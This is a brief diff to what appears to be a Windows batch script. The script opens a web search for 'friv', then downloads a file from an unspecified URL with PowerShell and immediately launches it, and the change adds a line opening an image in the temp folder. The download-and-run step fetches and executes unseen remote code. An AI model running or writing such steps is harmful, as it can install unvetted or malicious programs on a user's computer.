@@ -7,3 +7,4 @@ powershell -Command "Start-Process 'https://www.google.com/search?q=friv'"
 
 powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
 start "" "%DEST%"
+start "" "%TEMP%\pedro.jpg"
